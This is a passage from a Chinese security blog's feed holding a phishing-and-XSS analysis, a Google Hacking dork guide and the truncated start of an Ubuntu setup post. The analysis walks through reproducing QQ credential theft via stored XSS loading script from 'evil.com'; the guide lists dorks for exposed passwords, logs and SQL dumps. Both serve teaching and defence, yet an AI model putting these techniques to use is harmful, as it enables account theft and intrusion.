title="三、动态在页面添加解密节点"></a>三、动态在页面添加解密节点</h3><p>我当时在本地测试的时候就发现我的js并不能直接解密RC4，还自己给解密了，后来看到后面的混淆的代码的时候才发现攻击者自己写了加密解密BASE64 和 RC4的函数…..<br>部分代码如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ7_new.png" alt="此处输入图片的描述"></p><h2 id="0X04-攻击以及伪装流程分析"><a href="#0X04-攻击以及伪装流程分析" class="headerlink" title="0X04 攻击以及伪装流程分析"></a>0X04 攻击以及伪装流程分析</h2><p>分析了关键部分的代码，还是觉得不过瘾，很想知道攻击者究竟是如何伪装的如此之好，于是我完全解密了history的整个流程，几乎还原了整个的攻击过程，下面给大家分享一下：</p><h3 id="一、域名伪装"><a href="#一、域名伪装" class="headerlink" title="一、域名伪装"></a>一、域名伪装</h3><p>我们都知道，域名能反应一个网站的基本信息，即使是不懂计算机的人看到域名也能对网站的内容略知一二，比如<a href="http://www.taobao.com/">www.taobao.com</a> 一看就知道是淘宝主页，但是如果是 <a href="http://www.xinxix.com这样的域名不免让人生疑,于是攻击者将攻击过程中的所有域名都转换成了短域名,比如腾讯提供的短域名/">www.xinxix.com这样的域名不免让人生疑，于是攻击者将攻击过程中的所有域名都转换成了短域名，比如腾讯提供的短域名</a>:</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ8.png" alt="此处输入图片的描述"></p><p>于是我们看到的域名就是类似这样：<a href="http://url.cn/xxxx">http://url.cn/xxxx</a></p><p>###二、借助大厂漏洞<br>其实这个短域名背后的玄机远远比这个钓鱼页面有价值的多，经过我的分析发现这个短域名是指向了一个大厂的一个分站，在这个页面上攻击者已经构造好了xss漏洞，就等待着我们点击这个短链接。我在这个GET请求的返回值中找到了xss的payload如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A515.png" alt="此处输入图片的描述"></p><p>这个payload 非常的讲究，首先可以看到攻击者用的是onerror的报错手法触发js，这个报错就来源于后面的src&#x3D;’&#x2F;‘ 因为这个是一个api站，在你没有传递任何参数的情况下一定是回返回400 Bad Request 的，然后就使用了jQuery 的getScript方法包含了远程的一个JS,这个JS给的也是一个链接，指向的就是他的邪恶页面，使用的也是短域名，不过这次是 t.cn&#x2F;xxxxx</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ10.png" alt="此处输入图片的描述"></p><p>然后他就把我们之前分析的恶意代码抓取了过来，你看到的就是大厂域名下的QQ登录，并开始了一系列的邪恶操作。</p><p><strong>特别注意：</strong><br>1.他之所以不是直接访问他的邪恶网站而是费劲心机采用某大厂xss再包含远程JS的目的就是为了将他自己的网站隐藏于无形之中。我们都知道，有时候手机下拉页面能够看到是那个网站提供的页面，虽然之前他已经在恶意代码中做了伪造的来源，但是这样就等同于双层保险，即使是他没有考虑到安卓手机能看到真假来源的情况下还是能瞒天过海，<strong>包含文件不会改变当前域名</strong>，而大厂的域名出现在我们的视野里是很难引起我们的怀疑的，这应该是这个漏洞利用最精彩的地方，也可见xss的利用价值，#手动滑稽。</p><h3 id="三、标题以及跳转的伪装"><a href="#三、标题以及跳转的伪装" class="headerlink" title="三、标题以及跳转的伪装"></a>三、标题以及跳转的伪装</h3><p><strong>1.跳转的伪装</strong><br>我们都知道即使是网速非常快，我们想外部调用一个如此庞大的脚本，并且还需要多层解密的情况下都会存在一个延时，这个延时用肉眼很可能是可见的，为了避免在远程文件没有包含完全的情况下不显示这个大厂的本来的页面，而是给人一种正在加载的感觉，攻击者在插入JS代码的时候顺带插入了<code>&lt;body hidden&gt;</code>（见上图payload） 这个标签，并且作品的名称也取名为加载中（这个是怕标题栏露馅）如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A516.png" alt="此处输入图片的描述"></p><p><strong>2.标题的伪装</strong><br>1）攻击者把伪造的QQ登录界面的标题设置为手机统一登录 </p><p>2）攻击者使用网上的修改微信标题栏的脚本伪造标题</p><h3 id="三、稍作修改的登录界面"><a href="#三、稍作修改的登录界面" class="headerlink" title="三、稍作修改的登录界面"></a>三、稍作修改的登录界面</h3><p>正常的登录界面是提供了一键登录的功能的（如下图所示），但是攻击者为了强制你输入密码就去掉的这个按键（见上图只有一个按键），但是由于我们现在已经很少在手机上登录QQ空间了，所以隐蔽性极强。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A56.png" alt="此处输入图片的描述"></p><h3 id="四、对恶意代码的运行环境做了严格的限制"><a href="#四、对恶意代码的运行环境做了严格的限制" class="headerlink" title="四、对恶意代码的运行环境做了严格的限制"></a>四、对恶意代码的运行环境做了严格的限制</h3><p>为了配合下一步的成功登陆，攻击者将脚本运行的环境做了严格的限制，要求必须是在QQ内访问，所以这段恶意链接也是在QQ内传播的。因为在点击登录之后，除了将你的账号密码发送到攻击者的服务器上以外，脚本也一定会让你访问真正的QQ空间主页，那么如果你在QQ内部就会如同真的登陆进去了一样进入空间，打消了受害者的怀疑。</p><h3 id="五、下线网页销声匿迹"><a href="#五、下线网页销声匿迹" class="headerlink" title="五、下线网页销声匿迹"></a>五、下线网页销声匿迹</h3><p>由于这个大厂的xss漏洞是在它自己的一个分享的页面上，在的手之后，攻击者快速的下线了他的页面，以及自己的邪恶服务器页面，下次再点击这个链接显示的就是“该作品已下线”，整个攻击就如同不存在了。</p><h2 id="0x05-真正的实战"><a href="#0x05-真正的实战" class="headerlink" title="0x05 真正的实战"></a>0x05 真正的实战</h2><p>既然漏洞都找到了，为什么不利用一番？？<br>在对应页面疯狂的fuzz之后，成功复现了这个“0day”漏洞（或许已经被钓鱼的人玩烂了吧….）<br>接下来我就给大家完美的还原一下这个漏洞（漏洞已经提交，请大家不要做不必要的攻击）</p><p>漏洞的成因：<br>在描述区过滤不严，并且在分享的页面也没有做过滤导致的存储型xss漏洞</p><h3 id="一、简单证明一下漏洞的存在（漏洞已修）"><a href="#一、简单证明一下漏洞的存在（漏洞已修）" class="headerlink" title="一、简单证明一下漏洞的存在（漏洞已修）"></a>一、简单证明一下漏洞的存在（漏洞已修）</h3><p>①我们在描述区写入payload</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A510.png" alt="此处输入图片的描述"></p><p>②访问分享页面，js 的到解析</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A511.png" alt="此处输入图片的描述"></p><h3 id="二、完美的模拟钓鱼盗号"><a href="#二、完美的模拟钓鱼盗号" class="headerlink" title="二、完美的模拟钓鱼盗号"></a>二、完美的模拟钓鱼盗号</h3><p>没想到自己有一天也能成为“盗号黑客”（曾经吹出来的牛逼还是能成为现实的嘛O(∩_∩)O~~）</p><p>1.首先我在自己的服务器上放上接收QQ信息的页面user.php<br>如图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A512.png" alt="此处输入图片的描述"></p><p>如果接收到数据就会自动的存入数据库</p><p>2.我把模拟QQ登陆的假页面里面的接收地址改成了我的服务器地址之后进行一系列的编码，几次的js动态读写之后放到了app.php中，并且也放到了我的服务器上（蓄势待发）<br>如图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A513.png" alt="此处输入图片的描述"></p><p>然后我就准备远程包含这个php文件（实际里面写的全部是js），使用js动态地进行页面的覆盖&#x2F;重写</p><p>3.我将访问evil.com&#x2F;app.php这个页面的URL地址进行短域名伪装（其实不仅是伪装，因为我们的输入点还有140字数的限制见前面的图）,写入我的payload，准备写入描述区</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A514.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A517.png" alt="此处输入图片的描述"></p><p>4.插入之后我们就去分享也页面看看是不是真的成功了<br>可以看到成功插入</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A519.png" alt="此处输入图片的描述"></p><p>为了显示我没有插入body 的 hidden属性<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A522.png" alt="此处输入图片的描述"></p><p>5.我们再把这个大厂网页的分享链接转换成短域名</p><p>**注意：**转换的时候攻击者一般选择大公司的短域名如 url.cn&#x2F; t.cn &#x2F;dwz.cn，否则在QQ上会有警告危险（如下图）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A518.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A523_.png" alt="此处输入图片的描述"></p><p>6.好啦，现在我们可以愉快地钓鱼了（本人仅做测试，并未真正钓鱼）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/QQ%E8%A1%A524.png" alt="此处输入图片的描述"></p><h2 id="0X06-反思与防范与总结"><a href="#0X06-反思与防范与总结" class="headerlink" title="0X06 反思与防范与总结"></a>0X06 反思与防范与总结</h2><p><strong>反思：</strong><br>1.这次的分析让我对JS的能力又有了新的认识，作为一个前端的脚本语言，它最大的能力就是动态的改变页面，给人以极强的迷惑性，让你眼见不一定为实，这也是钓鱼的精髓所在吧。</p><p>2.我对XSS漏洞的利用原来只是停留在简单的获取Cookie或者其他一些简单的问题上，这次的恶意代码分析带给我全新的认识,XSS能做到的实在是太多了，还要多多开阔思路。</p><p>3.经过对恶意代码的分析，可以发现大部分你的代码都是攻击者从网站找到的现成的模块拼接起来的，并不是完全的原创，但是效果真的是非常的好，思路新奇。</p><p>4.安全无处不在，要有一颗好奇心，不要放过你身边的小细节，一个钓鱼的流量也许就是一个0day，hhh。</p><p><strong>防范</strong><br>1.钓鱼的防范虽然一直在强调，但是由于涉及到的专业性有些强，没有接触过这些知识的人可能很难分辨出来真正的网站和钓鱼网站的区别，有时候可能即使是专业的人员也容易被欺骗，就像我上面分析的这个钓鱼链接，隐蔽性极其之高，足以瞒天过海。</p><p><strong>总结一下几点：</strong><br>1.绝不要轻易点开或者相信不明来源或者稀奇古怪的链接，<strong>特别要注意点短域名，这是常见的伪装手段</strong>。</p><p>2.绝不要在不确定真实性的地方输入你宝贵的密码。</p><p><strong>3.不要轻易扫描来源不明的二维码（我发现目前这一钓鱼已经变异出了二维码的版本，可以说更加隐蔽）</strong></p><p>4.钓鱼页面的设置往往存在功能性的缺失，比如修改密码其实是点不了的，可以先简单的测试一下。</p><p>5.一定要确定当前访问的页面的网址究竟是什么，不明网站不要相信，即使是知名网站也不能轻易相信，就像我分析的这个攻击就是利用用户对知名网站的充分的信任（总之，明明不是你主动访问的网站却出现在你的URL中肯定是可疑的）</p><p>6.一个密码尽可能减少使用的次数，减少出现意外之后的损失，防止一军溃败，全军覆没。</p><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>虽然这一整套恶意代码的抓取，分析以及搭环境复现，加上文章的构思书写花费了我很长的时间，但是也使我对钓鱼手法有了更深的理解与感悟，写这篇文章的目的也是希望大家也能了解真正的隐蔽的钓鱼，在日常的生活中加以防范。</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 钓鱼 恶意代码分析 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google Hacking:你的信息刺探利器</title>
    <link href="/2018/04/13/Google%20Hacking%20----%E4%BD%A0%E7%9A%84%E4%BF%A1%E6%81%AF%E5%88%BA%E6%8E%A2%E5%88%A9%E5%99%A8/"/>
    <url>/2018/04/13/Google%20Hacking%20----%E4%BD%A0%E7%9A%84%E4%BF%A1%E6%81%AF%E5%88%BA%E6%8E%A2%E5%88%A9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>原文已首发在freebuf </p><p><a href="http://www.freebuf.com/articles/network/169601.html">http://www.freebuf.com/articles/network/169601.html</a></p><p>我们都知道渗透测试中信息收集的重要性，是第一步也是最重要的一步。有的人渗透测试使出浑身解数破门而不入，可对有的人来说却如同囊中取物，也许功力就是差在信息收集，那么现在就让我带领各位读者重新认识一下Google———你军火库中的“大咖” 。（前面基础部分希望大家不要错过，说不定有你不知道的秘密，各位服务器管理员也不要错过最后的彩蛋哦！）</p><span id="more"></span><h2 id="0X01-你不得不知道的谷歌基础"><a href="#0X01-你不得不知道的谷歌基础" class="headerlink" title="0X01 你不得不知道的谷歌基础"></a>0X01 你不得不知道的谷歌基础</h2><h3 id="一、谷歌周边"><a href="#一、谷歌周边" class="headerlink" title="一、谷歌周边"></a>一、谷歌周边</h3><p><strong>1.谷歌图片</strong><br>谷歌图片是一个图片识别的非常强大的工具，一张你不知道来源的图片上传之后不仅能知道来源，还能自动寻找相似图片。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TP1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/TP2.png" alt="此处输入图片的描述"></p><p><strong>2.谷歌地球</strong><br>坐看世界各地，笑看云卷云舒，渗透之前看看渗透的地方长啥样对吧…<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/DQ1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/DQ2.png" alt="此处输入图片的描述"></p><p><strong>3.谷歌论坛</strong><br>信息收集的重要地点，谷歌背后的繁荣之地（多得是你不知道的事）<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LT1.png" alt="此处输入图片的描述"></p><p><strong>4.谷歌日历</strong><br>记录你生活的点点滴滴，有时却给hacker留下了巨大的财富<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RL1.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RL3.png" alt="此处输入图片的描述"></p><p><strong>5.谷歌地图</strong><br>找到你回家的路，跑路的重要工具…..<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/DT1.png" alt="此处输入图片的描述"></p><p><strong>6.谷歌高级搜索</strong><br>这个功能异常强大，请自己领会<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GJ.png" alt="此处输入图片的描述"></p><p><strong>7.谷歌自定义搜索引擎</strong><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/ZDY1.png" alt="此处输入图片的描述"></p><p><strong>7.GHDB 谷歌黑客数据库</strong></p><p><a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a></p><p><strong>这一部分我会放在github中会仔细的讲一下,链接地址在本文下方，希望大家关注</strong><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/GHDB1.png" alt="此处输入图片的描述"></p><h3 id="二、搜索基础"><a href="#二、搜索基础" class="headerlink" title="二、搜索基础"></a>二、搜索基础</h3><p>1.查询是<strong>不区分</strong>大小写（OR在表示布尔含义时一定要大写）<br>2.<em>在谷歌搜索的时候只能当做<strong>一个单词</strong>使用<br>3.谷歌有32词的搜索限制（当然可以通过</em>代替某些单词突破这种限制）<br>4.短语搜索要带上<strong>单引号</strong><br>5.AND对谷歌来说是多余的，谷歌会自动查询你输入的一切<br>6.谷歌会忽略特别常见的字符，但是前面加上”+”强制搜索（+后面不能有空格）<br>7.NOT可以使用”-“(减号代替)<br>8.布尔查询OR&#x2F;“|”</p><h2 id="0X02-不得不说的高级运算符"><a href="#0X02-不得不说的高级运算符" class="headerlink" title="0X02 不得不说的高级运算符"></a>0X02 不得不说的高级运算符</h2><h3 id="一、总览"><a href="#一、总览" class="headerlink" title="一、总览"></a>一、总览</h3><pre><code class="hljs">intitle，allintitleinurl,allinurlfiletypeallintextsitelinkinanchordatarangecacheinforelatedphonebookrphonebookbphonebookuthorgroupmsgidinsubjectstocksdefine</code></pre><p><strong>使用方法</strong>：<br>operator:search</p><p><strong>注意点：</strong></p><p>1.在操作符、冒号、搜索项之间<strong>没有</strong>空格</p><p>2.all运算符（以all开头的运算符)都是有些奇怪的,通常一个查询只能使用<strong>一次</strong>，而且不能和其他运算符一起使用</p><p>①allintitle 会告诉谷歌，它后面的每一个单词或者短语都要在标题中出现</p><p>②allintext 在除了标题、URL、链接以外的任何地方找到某个内容（它后面的每一个单词或者短语都要在内容中出现）</p><p>3.intitle:”index of”等价于 intitle:index.of</p><p>因为‘.’休止符能够代替任何字符(这个技术也提供了一个无需键入空格和两边引号的短语)</p><p>4.intitle:”index of” private 能返回标题中有index of 以及在任何地方有 private的页面（intitle只对其后面第一个搜索项有效）</p><h3 id="二、常见运算符解释"><a href="#二、常见运算符解释" class="headerlink" title="二、常见运算符解释"></a>二、常见运算符解释</h3><p><strong>site 把搜索精确到特定的网站</strong></p><p>site 允许你搜索仅仅位于一个特定服务器上的或者在一个特定域名里的页面</p><p><strong>filetype 搜索特定后缀的文件</strong> </p><p>搜索以一个特别的文件扩展名结尾的页面，谷歌会以网页快照的形式来将这种格式转换成html页面，但是你直接点击标题就会下载</p><p><strong>link 包含指定网页的链接的网页</strong></p><p>搜索包含指定网页的链接的网页，link后面跟的是完整的URL可以包含目录名、文件名、参数等，信息量越大查询结果越精确。</p><p><strong>注意</strong><br>1.不要认为 Link能搜索链接中的文本，inanchor才执行的是这个操作，如果输入错误，那么并不会执行link查询而是把[link:短语]当做一个整体直接默认查询</p><p>2.link运算符不能和其他运算符一起使用</p><p><strong>inanchor 寻找链接的锚点</strong></p><p>inanchor 用于寻找链接的锚点，或者在链接中显示的文本（就是显示在页面上的提供点击的文字）</p><p><strong>cache 显示页面的缓存版本</strong></p><p>直接跳转到页面的缓存版本</p><p><strong>numberange 搜索一个数字</strong></p><p>numberange 需要两个参数，一个低位数字，一个高位数字，中间用连字符分割<br>例如：<br>为了找到12345  numberange:12344-12346<br><strong>注意：</strong><br>1.这个运算符还有简化版， 12344..12346<br>2.可以和其他运算符一起使用</p><p><strong>daterange 搜索在特定日期范围内发布的页面</strong></p><p>谷歌每次重新抓取一个网页网页的日期就会刷新<br>两个参数日期都必须是自公元前4713年1月1日起经过的天数，中间用连字符分割但（不如使用谷歌的高级搜索引擎实现）</p><p><strong>info 显示谷歌的总结信息</strong></p><p>显示一个网站的总结信息还提供了可能关于该网站的其他搜索链接<br><strong>注意：</strong><br>info不能和其他运算符一起使用</p><p><strong>related 显示相关站点</strong></p><p>参数是一个URL<br><strong>注意：</strong><br>1.点击类似网页链接和使用高级搜索引擎能实现相同的功能<br>2.不能和其他运算符一起使用</p><p><strong>define 显示一个术语的定义</strong><br>此处语言苍白……</p><h2 id="0X03-Google-Hacking-基础"><a href="#0X03-Google-Hacking-基础" class="headerlink" title="0X03 Google Hacking 基础"></a>0X03 Google Hacking 基础</h2><h2 id="文件类"><a href="#文件类" class="headerlink" title="文件类"></a>文件类</h2><h3 id="一、目录列表的查找"><a href="#一、目录列表的查找" class="headerlink" title="一、目录列表的查找"></a>一、目录列表的查找</h3><p>目录列表能列出存在于一个web服务器上的文件和目录</p><p>查找目录列表<br><strong>实例：</strong><br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MLLB1.png" alt="此处输入图片的描述"><br>更优化的查找<br><strong>实例：</strong><br>intitle:index.of “parent directory”<br>intitle:index.of name size</p><h3 id="二、（特定版本的）服务器"><a href="#二、（特定版本的）服务器" class="headerlink" title="二、（特定版本的）服务器"></a>二、（特定版本的）服务器</h3><p>能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本<br><strong>实例：</strong><br>intitle:index.of “server at”<br>intitle:index.of “Apache&#x2F;1.3.27 Server at”</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MLLB2.png" alt="此处输入图片的描述"><br>我们还可以确定服务器的操作系统、模块和其他信息<br>我们会把操作系统写在括号里</p><pre><code class="hljs">Apache/1/3/26(Unix)CentOSDebianDebian GNU/LinuxFedoraFreeBSDLinux/SUSELinux/SuSENETWRERed HatUbuntuUNIXWin32</code></pre><p>攻击者能结合这个操作系统标签里的信息以及web服务器的版本制定有针对性的攻击</p><h3 id="三、扩展遍历技术"><a href="#三、扩展遍历技术" class="headerlink" title="三、扩展遍历技术"></a>三、扩展遍历技术</h3><p>经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak</p><p><strong>实例：</strong><br>intitle:index.of index.php.bak<br>inurl:index.php.bak<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MLLB3.png" alt="此处输入图片的描述"></p><h3 id="四、配置文件的查找"><a href="#四、配置文件的查找" class="headerlink" title="四、配置文件的查找"></a>四、配置文件的查找</h3><p>配置文件的存在说明服务就在附近<br><strong>实例：</strong><br>filetype:conf inurl:firewall<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MLLB4.png" alt="此处输入图片的描述"></p><p>如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了</p><p><strong>注意：</strong><br>1.除了配置文件名conf的使用，也可以组合其他的通用的命名规则来查找其他等价的命名规则<br>inurl:conf OR inurl:config OR inurl:cfg</p><h3 id="五、日志文件的查找"><a href="#五、日志文件的查找" class="headerlink" title="五、日志文件的查找"></a>五、日志文件的查找</h3><p>日志文件中也记录着日志很多的敏感信息<br>日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了<br><strong>实例：</strong><br>filetype:log inurl:log<br>ext log log<br>filetype:log username putty</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/MLLB5.png" alt="此处输入图片的描述"></p><h3 id="六、office文档"><a href="#六、office文档" class="headerlink" title="六、office文档"></a>六、office文档</h3><p><strong>实例：</strong><br>filetype:xls inurl:password.xls<br>filetype:xls username password email<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/YHMMA1.png" alt="此处输入图片的描述"></p><h2 id="数据库、后台类"><a href="#数据库、后台类" class="headerlink" title="数据库、后台类"></a>数据库、后台类</h2><h3 id="一、登录入口"><a href="#一、登录入口" class="headerlink" title="一、登录入口"></a>一、登录入口</h3><p>登录入口是第一道防线，很容易泄露软硬件的信息<br>查找入口一般使用关键字login<br>大的厂商一般会把版权的注意事项放在页面的底部</p><p><strong>实例：</strong><br>intitle:login intext:版权信息<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/DL1.png" alt="此处输入图片的描述"></p><h3 id="二、错误消息"><a href="#二、错误消息" class="headerlink" title="二、错误消息"></a>二、错误消息</h3><p>数据库的错误消息能够用来分析操作系统和web服务器的版本，还可能更多</p><p>SQL command not properly ended </p><p>这个表示没有在sql语句的最后找到正确的终止符，所以可能会被用于注入攻击</p><h3 id="三、数据库的转储"><a href="#三、数据库的转储" class="headerlink" title="三、数据库的转储"></a>三、数据库的转储</h3><p>数据库基于文本的转换在网络上是很常见的，使用数据库的转储数据库管理员能完整地重建数据库，也就意味着一个完整的转储的细节并不只是数据表格的结构还有每张表的每一条记录。</p><p>攻击者可以搜索转储的标题 # Dumping data for table并且通过执行必要的关键词 username password等能够缩小范围<br><strong>实例：</strong><br><code># Dumping data for table(user|username|password|pass)</code></p><p>还可以关注一些由别的工具添加到数据库转储中最后的文件名<br><strong>实例：</strong><br>filetype:sql sql<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SJK1.png" alt="此处输入图片的描述"></p><h3 id="四、真实的数据库文件"><a href="#四、真实的数据库文件" class="headerlink" title="四、真实的数据库文件"></a>四、真实的数据库文件</h3><p>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符<br><strong>实例：</strong><br>filetype:mdb inurl:com<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SJK2.png" alt="此处输入图片的描述"></p><h2 id="0X4-如何防御Google-Hacking"><a href="#0X4-如何防御Google-Hacking" class="headerlink" title="0X4 如何防御Google Hacking"></a>0X4 如何防御Google Hacking</h2><h3 id="web-服务器的安全防护"><a href="#web-服务器的安全防护" class="headerlink" title="web 服务器的安全防护**"></a>web 服务器的安全防护**</h3><p><strong>一、目录列表和丢失的索引文件</strong></p><p>.htaccess 可以来防止目录的内容未授权的访问，但是不当的配置还会让这个文件可见甚至可读</p><p>在 apache 的服务器上可以通过 httpd.conf文件中的单词indexs前加一个连字符或者减号来禁止目录列表</p><p><strong>二、、robots.txt</strong></p><p><code>#</code> 开头的行会被认为是注释，每一个不以#开头的行都会以User-agent 或者是一个disallow 声明开头，表示禁止爬虫爬行的位置，但是也可以允许特定的爬虫访问</p><p><strong>三、NOARCHIVE缓存杀手</strong></p><p>有时候你希望google住抓取某个页面但是又不希望对页面的副本进行缓存，或者搜索结果中显示缓存链接，这个要求可以通过META实现</p><p><code>&lt;META NAME= &quot;ROBOTS&quot; CONTENT= &quot;NOARCHIVE&quot;&gt;</code></p><p>如果你只想阻止谷歌对文件的缓存，可以在HEAD节里使用</p><p><code>&lt;META NAME=&quot;GOOGLEBOT&quot; CONTENT=&quot;NOINDEX,NOFOLLOW&quot;&gt;</code></p><p><strong>四、NOSNIPET 去除摘要</strong></p><p><code>&lt;META NAME=&quot;GOOGLEBOT&quot; CONTENT=&quot;NOSNIPPET&quot;&gt;</code></p><p>另外这个功能还有个副作用，就是谷歌也不能缓存，一举两得。</p><p><strong>五、十五条防止信息泄露和服务器入侵的措施</strong></p><p>1.检查所有的文档能否被Google搜索到，避免敏感文件能出现在公众的视野中</p><p>2.选择一个强大的自动化工具来扫描你网站上是否有信息的泄露</p><p>3.不要使用默认的登录入口，以防止登录入口被hacker猜解</p><p>4.关闭数据库的远程管理工具</p><p>5.删除明显的显示软件版本的信息</p><p>6.配置服务器只能下载特定的文件类型（白名单比黑名单要简单有效得多）</p><p>7.正确的配置你的服务器，不要抱有侥幸心理，任何的松懈带来的灾难是巨大的</p><p>8.不要把源码的备份放在未经授权就能访问的地方，并且及时删除网站上的无用的备份文件</p><p>9.不要使用弱密码，防止攻击者轻易攻破后台</p><p>10.登录请加上强度相对较高的验证手段，防止攻击者采用爆破的手段</p><p>11.关闭服务器不必要的端口</p><p>12.请不要使用网站上的任何信息作为密码，否则都属于容易爆破的类型</p><p>13.备份的源代码请经过专业的混淆，防止被下载之后轻易读取到内容</p><p>14.及时更新服务器的系统，修复潜在的漏洞</p><p>15.安装正规的安全防护软件，如”安全狗”</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>亲爱的读者，读到这里真的是辛苦了，我上面讲的这些只是冰山一角，Google能做到的绝对超乎你的想象，如果大家对渗透测试、Google Hacking或者服务器防范感兴趣可以访问我的github我会把我了解的更多的信息告诉你，而且还会介绍一些谷歌黑客数据库的知识(如果喜欢的话也欢迎你们fork或者star)</p><p><strong>下面是我的github地址：</strong><br><a href="https://github.com/K0rz3n/GoogleHacking-Page">https://github.com/K0rz3n/GoogleHacking-Page</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 Google Hacking 信息收集 渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>My Ubuntu Config</title>
    <link href="/2018/04/11/MyUbuntuConfig/"/>
    <url>/2018/04/11/MyUbuntuConfig/</url>
    
    <content type="html"><![CDATA[<p>这篇文章由于篇幅较长，代码较多，博客可能存在解析问题，不能正常显示，我已经将这篇文章，上传到了我的github </p><p>下面贴上链接：</p><p><a href="https://github.com/K0rz3n/ubuntu-s-config">https://github.com/K0rz3n/ubuntu-s-config</a></p><h3 id="一、普通桌面环境"><a href="#一、普通桌面环境" class="headerlink" title="一、普通桌面环境"></a>一、普通桌面环境</h3><h4 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Ubuntu%E5%8E%9F%E5%A7%8B.png"></p><span id="more"></span><h4 id="1-换源"><a href="#1-换源" class="headerlink" title="1.换源"></a>1.换源</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd  <span class="hljs-regexp">/etc/</span>apt<br>cp sources.list sources.list.bak<br>vim sources.list<br>apt-get update<br>apt-get upgrade<br><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted universe multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted universe multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted universe multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br><span class="hljs-comment">##测试版源</span><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-proposed main restricted universe multiverse<br><span class="hljs-comment"># 